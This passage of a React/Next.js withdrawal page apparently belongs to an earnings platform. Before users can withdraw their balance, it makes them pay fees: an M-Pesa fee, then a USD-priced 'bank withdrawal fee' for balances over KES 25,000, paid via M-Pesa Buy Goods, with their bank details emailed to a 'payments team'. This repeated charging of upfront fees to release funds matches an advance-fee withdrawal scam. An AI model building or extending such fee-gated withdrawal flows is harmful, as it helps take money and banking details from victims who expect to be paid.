        <div style={{ fontSize: 12, marginTop: 4, color: accountNumber && !acctValid ? '#4b5563' : '#9ca3af' }}>
          {accountNumber && !acctValid ? `Doesn't match ${selectedBank.name}. It should look like: ${selectedBank.ph}` : `Format for ${selectedBank.name}: ${selectedBank.ph}`}
        </div>
      )}

      {errors.form && <div style={{ color: '#4b5563', fontSize: 13, marginTop: 12 }}>{errors.form}</div>}
      {formValid ? (
        <button className="pay-btn" style={{ background: '#000000', marginTop: 20 }} onClick={handleSubmit} disabled={sending}>
          {sending ? <><span className="spinner" /> Submitting…</> : <><Icon name="cash" size={16} /> Submit Withdrawal Request</>}
        </button>
      ) : (
        <div style={{ marginTop: 20, textAlign: 'center', fontSize: 13, color: '#9ca3af', padding: '12px', background: '#f9fafb', borderRadius: 10, border: '1px dashed #e5e7eb' }}>
          {!accountName.trim() ? 'Enter your name to continue' : !selectedBank ? 'Select your bank to continue' : 'Enter a valid account number to reveal Submit'}
        </div>
      )}
      <div className="pay-secure" style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6 }}><Icon name="lock" size={13} /> Your account details are encrypted and secure</div>
    </FlowShell>
  );
}

// ── Bulk withdrawal flow (balances ≥ KES 25,000 → bank transfer only) ─────────
// Notice (previous M-Pesa fee?) → server-authoritative quote (live FX + capped
// deductions) → validated bank details → submit + pay the computed amount due.
function BulkWithdrawalFlow({ user, paidRef }) {
  const router = useRouter();
  // Returning from a verified Paystack fee payment lands straight on success.
  const [step,         setStep]         = useState(paidRef ? 'success' : 'notice');   // notice | details | success
  const [declaredFees, setDeclaredFees] = useState(null);       // 0 | 1 | 2 (declared M-Pesa fees)
  const [quote,        setQuote]        = useState(null);
  const [loadingQuote, setLoadingQuote] = useState(false);
  const [submitting,   setSubmitting]   = useState(false);
  const [err,          setErr]          = useState('');
  const [errors,       setErrors]       = useState({});
  const [bank,         setBank]         = useState({
    bankName: '', accountName: user?.fullName || '', accountNumber: '', branch: '', swift: '',
  });

  const setField = (k, v) => { setBank(b => ({ ...b, [k]: v })); setErrors(e => ({ ...e, [k]: undefined })); };
  const bankValid = bank.bankName.trim() && bank.accountName.trim() && bank.accountNumber.trim();

  async function loadQuote(n) {
    setLoadingQuote(true); setErr('');
    const q = await bulkWithdrawalQuote(n);
    setLoadingQuote(false);
    if (!q?.success) { setErr(q?.error || 'Could not calculate the withdrawal fee. Please try again.'); return false; }
    setQuote(q);
    return true;
  }

  async function chooseCount(n) {
    setDeclaredFees(n);
    if (await loadQuote(n)) setStep('details');
  }

  async function submit() {
    const e = {};
    if (!bank.bankName.trim())      e.bankName      = 'Bank name is required';
    if (!bank.accountName.trim())   e.accountName   = 'Account name is required';
    if (!bank.accountNumber.trim()) e.accountNumber = 'Account number is required';
    setErrors(e);
    if (Object.keys(e).length) return;

    setSubmitting(true); setErr('');
    const res = await submitBulkWithdrawal({ ...bank, declaredFees });
    if (!res?.success) { setSubmitting(false); setErr(res?.error || 'Submission failed. Please try again.'); return; }

    // Email the authoritative request + bank details to the payments team.
    await sendNotify({
      type: 'Bulk Bank Withdrawal Request',
      name: bank.accountName.trim(), email: user?.email || '', phone: user?.phone || '',
      subject: 'Bulk Bank Withdrawal Request (≥ KES 25,000)',
      details:
        `Account Holder: ${bank.accountName.trim()}\nBank: ${bank.bankName.trim()}\nAccount Number: ${bank.accountNumber.trim()}\n` +
        `Branch: ${bank.branch.trim() || '—'}\nBank/SWIFT Code: ${bank.swift.trim() || '—'}\n\n` +
        `Balance: KES ${Number(res.balance).toLocaleString()}\n` +
        `Fee: USD ${res.feeUsd} @ ${res.rate} = KES ${res.convertedKes.toLocaleString()}\n` +
        `Deductions: ${res.eligibleDeductions} × KES ${res.perFeeKes} = KES ${res.deductionKes.toLocaleString()}\n` +
        `Amount Due: KES ${res.amountDueKes.toLocaleString()}\n\n` +
        `Requested by: ${user?.fullName || ''} (${user?.email || ''})`,
    });

    setSubmitting(false);
    setStep(res.amountDueKes > 0 ? 'pay' : 'success');
  }

  const rateNote = quote && !quote.rateLive ? ' (approx.)' : '';

  return (
    <FlowShell title="Bulk Withdrawal" subtitle="Bank transfer required" icon="cash">
      {step === 'notice' && (
        <>
          <div className="pay-message" style={{ borderColor: '#111827', background: '#f9fafb' }}>
            <div style={{ fontWeight: 800, marginBottom: 8, display: 'flex', alignItems: 'center', gap: 8 }}>
              <Icon name="warning" size={16} /> Bulk Withdrawal Notice
            </div>
            Your available balance of <strong>KES {Number(user.balance).toLocaleString()}</strong> exceeds{' '}
            <strong>KES {BULK_THRESHOLD_KES.toLocaleString()}</strong>, which qualifies as a bulk withdrawal.
            For security and compliance purposes, this amount can only be withdrawn through your registered
            <strong> bank account</strong>.
          </div>

          <div style={{ fontWeight: 700, fontSize: 15, color: '#111827', margin: '4px 0 12px' }}>
            How many successful M-Pesa withdrawal fees have you paid before?
          </div>
          <div style={{ fontSize: 12.5, color: '#6b7280', marginBottom: 12 }}>
            Each previous <strong>KES 650</strong> M-Pesa fee is credited against the bank fee (maximum of two).
          </div>
          {err && <div style={{ color: '#4b5563', fontSize: 13, marginBottom: 12 }}>{err}</div>}

          {[
            [0, 'None — I have not paid before', 'No deduction'],
            [1, 'Once', 'Credit KES 650'],
            [2, 'Twice or more', 'Credit KES 1,300 (max)'],
          ].map(([n, label, sub]) => (
            <button key={n} className="pay-btn"
              style={{ background: n === 0 ? '#374151' : '#000000', marginBottom: 12, flexDirection: 'column', gap: 2, alignItems: 'center', height: 'auto', padding: '12px 16px' }}
              disabled={loadingQuote} onClick={() => chooseCount(n)}>
              {loadingQuote && declaredFees === n
                ? <><span className="spinner" /> Calculating…</>
                : <>
                    <span style={{ fontWeight: 700 }}>{label}</span>
                    <span style={{ fontSize: 11.5, fontWeight: 500, opacity: 0.8 }}>{sub}</span>
                  </>}
            </button>
          ))}
        </>
      )}

      {step === 'details' && quote && (
        <>
          <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f3f4f6' }}>
            Bank withdrawal is mandatory for balances of <strong>KES {BULK_THRESHOLD_KES.toLocaleString()}</strong> or more.
            The processing fee below is converted from <strong>USD {quote.feeUsd}</strong> at the live exchange rate.
          </div>

          {/* Fee breakdown */}
          <div style={{ border: '1px solid var(--gray-light)', borderRadius: 12, padding: 16, marginBottom: 18 }}>
            <div style={brRow}><span>Bank Withdrawal Fee</span><span>USD {quote.feeUsd}</span></div>
            <div style={brRow}><span>Exchange Rate (live)</span><span>1 USD = KES {quote.rate}{rateNote}</span></div>
            <div style={brRow}><span>Converted Amount</span><strong>KES {quote.convertedKes.toLocaleString()}</strong></div>
            <div style={{ ...brRow, color: '#6b7280' }}><span>M-Pesa fees credited</span><span>{quote.eligibleDeductions} × KES {quote.perFeeKes.toLocaleString()}</span></div>
            {Array.from({ length: quote.eligibleDeductions }).map((_, i) => (
              <div key={i} style={{ ...brRow, color: '#374151' }}><span>Deduction {i + 1} (M-Pesa fee)</span><span>− KES {quote.perFeeKes.toLocaleString()}</span></div>
            ))}
            {quote.eligibleDeductions > 0 && (
              <div style={brRow}><span>Total Deduction</span><strong>− KES {quote.deductionKes.toLocaleString()}</strong></div>
            )}
            <div style={{ ...brRow, borderTop: '1px solid var(--gray-light)', marginTop: 8, paddingTop: 12, fontSize: 16 }}>
              <span style={{ fontWeight: 700 }}>Amount Due</span>
              <strong style={{ fontSize: 20 }}>KES {quote.amountDueKes.toLocaleString()}</strong>
            </div>
            <button onClick={() => loadQuote(declaredFees)} disabled={loadingQuote}
              style={{ marginTop: 12, background: 'none', border: 'none', color: '#374151', fontSize: 12.5, fontWeight: 700, cursor: 'pointer', display: 'inline-flex', alignItems: 'center', gap: 6, padding: 0 }}>
              <Icon name="refresh" size={13} /> {loadingQuote ? 'Recalculating…' : 'Recalculate at current rate'}
            </button>
          </div>

          {/* Bank details */}
          <div style={{ fontWeight: 700, fontSize: 15, color: '#111827', marginBottom: 10 }}>Your Bank Account</div>
          {[
            ['bankName',      'Bank Name',                 'e.g. Equity Bank',       true],
            ['accountName',   'Account Name',              'Full name on the account', true],
            ['accountNumber', 'Account Number',            'e.g. 0123456789',        true],
            ['branch',        'Branch (optional)',         'e.g. Nairobi CBD',       false],
            ['swift',         'Bank Code / SWIFT (if any)','e.g. EQBLKENA',          false],
          ].map(([key, label, ph, req]) => (
            <div key={key} style={{ marginBottom: 12 }}>
              <div className="pay-phone-label">{label}{req && <span style={{ color: '#374151' }}> *</span>}</div>
              <input className="pay-phone-input" value={bank[key]} placeholder={ph}
                onChange={e => setField(key, e.target.value)}
                style={{ marginBottom: 0, borderColor: errors[key] ? '#4b5563' : undefined }} />
              {errors[key] && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors[key]}</div>}
            </div>
          ))}

          {err && <div style={{ color: '#4b5563', fontSize: 13, margin: '4px 0 10px' }}>{err}</div>}

          {bankValid ? (
            <button className="pay-btn" style={{ background: '#000000', marginTop: 8 }} disabled={submitting} onClick={submit}>
              {submitting ? <><span className="spinner" /> Submitting…</> : <><Icon name="arrowRight" size={16} /> Submit & Continue to Payment</>}
            </button>
          ) : (
            <div style={{ marginTop: 8, textAlign: 'center', fontSize: 13, color: '#9ca3af', padding: 12, background: '#f9fafb', borderRadius: 10, border: '1px dashed #e5e7eb' }}>
              Complete Bank Name, Account Name and Account Number to continue
            </div>
          )}
          <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => { setStep('notice'); setErr(''); }}>
            <Icon name="arrowLeft" size={14} /> Back
          </button>
          <div className="pay-secure" style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6, marginTop: 10 }}>
            <Icon name="lock" size={13} /> Verified server-side • fee recalculated at the live rate
          </div>
        </>
      )}

      {step === 'pay' && quote && (
        <>
          <div className="pay-message" style={{ borderColor: 'var(--mpesa-green)', background: '#f9fafb', marginBottom: 16 }}>
            Your request is recorded. Pay the <strong>KES {quote.amountDueKes.toLocaleString()}</strong> bank withdrawal fee via M-Pesa Buy Goods, then notify support to finish processing.
          </div>
          <MpesaPay
            purpose="withdrawal_fee"
            amount={quote.amountDueKes}
            defaultPhone={user?.phone || ''}
            payLabel={`Pay KES ${Number(quote.amountDueKes).toLocaleString()} via M-Pesa`}
            onSuccess={() => setStep('success')}
          />
        </>
      )}

      {step === 'success' && (
        <div style={{ textAlign: 'center', padding: '10px 0' }}>
          <div style={{ marginBottom: 8, display: 'flex', justifyContent: 'center', color: '#111827' }}><Icon name="check" size={52} /></div>
          <div style={{ fontFamily: 'var(--font-display)', fontSize: 22, fontWeight: 800, color: '#1f2937', marginBottom: 6 }}>Request Received</div>
          <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f3f4f6', textAlign: 'left', marginTop: 12 }}>
            We&apos;ve recorded your bulk bank withdrawal request and emailed a copy to our payments team at{' '}
            <strong>{user?.email}</strong>. They will process the transfer to your bank account.
          </div>
          {err && <div style={{ color: '#4b5563', fontSize: 13, marginTop: 8 }}>{err}</div>}
          <button className="pay-btn" style={{ background: '#000000', marginTop: 18 }} onClick={() => router.push('/dashboard')}>Back to Dashboard</button>
        </div>
      )}
    </FlowShell>
  );
}
const brRow = { display: 'flex', justifyContent: 'space-between', alignItems: 'center', fontSize: 13.5, color: '#111827', padding: '5px 0' };

export default function WithdrawPage() {
  const router = useRouter();
  const { user, ready } = useUser();
  const method = router.query.method;
  const stepQ  = router.query.step;

  if (!ready || !user) {
    return <FlowSkeleton rows={3} />;
  }

  // Bulk balances (≥ KES 25,000) ALWAYS use the dedicated bank-transfer workflow,
  // regardless of which withdraw button was pressed (e.g. the dashboard's
  // "Withdraw with M-Pesa" links straight to ?method=mpesa). This is what makes
  // the "how many M-Pesa fees have you paid?" step reachable for bulk users.
  const psref = typeof router.query.psref === 'string' ? router.query.psref : '';
  const isBulk = Number(user?.balance || 0) >= BULK_THRESHOLD_KES;
  if (isBulk) return <BulkWithdrawalFlow user={user} paidRef={psref} />;

  if (method === 'mpesa')         return <MpesaFlow user={user} initialStep={stepQ === 'form' ? 'form' : 'notice'} initialFeeRef={stepQ === 'form' ? psref : ''} />;
  if (method === 'postbank')      return <PostbankFlow user={user} initialStep={stepQ === 'form' ? 'form' : 'choice'} />;
  if (method === 'international')  return <InternationalFlow user={user} initialStep="form" initialFeeRef={stepQ === 'form' ? psref : ''} />;

  // Chooser
  const overLimit = Number(user?.balance || 0) >= BULK_THRESHOLD_KES;
  return (
    <FlowShell title="Withdraw" subtitle="Choose how you’d like to withdraw" icon="cash">
      {overLimit && (
        <div className="pay-message" style={{ borderColor: '#4b5563', background: '#f9fafb', marginBottom: 14 }}>
          Your balance is <strong>KES {Number(user.balance).toLocaleString()}</strong>. Bulk amounts above <strong>KES {BULK_THRESHOLD_KES.toLocaleString()}</strong> must be withdrawn <strong>through the bank</strong>, not M-Pesa.
        </div>
      )}
      <button className="pay-btn" style={{ background: overLimit ? '#9CA3AF' : 'var(--mpesa-green)', marginBottom: overLimit ? 6 : 14, opacity: overLimit ? 0.65 : 1, cursor: overLimit ? 'not-allowed' : 'pointer' }} disabled={overLimit} onClick={() => router.push('/withdraw?method=mpesa')}>
        <Icon name="smartphone" size={16} /> Withdraw with M-Pesa
      </button>
      {overLimit && <div style={{ fontSize: 12, color: '#4b5563', marginBottom: 14 }}>M-Pesa is unavailable for bulk balances, please use a bank option below.</div>}
      <button className="pay-btn" style={{ background: '#000000', marginBottom: 14 }} onClick={() => router.push('/withdraw?method=postbank')}>
        <Icon name="cash" size={16} /> Withdraw with Postbank Kenya
      </button>
      <button className="pay-btn" style={{ background: '#000000' }} onClick={() => router.push('/withdraw?method=international')}>
        <Icon name="globe" size={16} /> Withdraw from Other Countries
      </button>
    </FlowShell>
  );
}
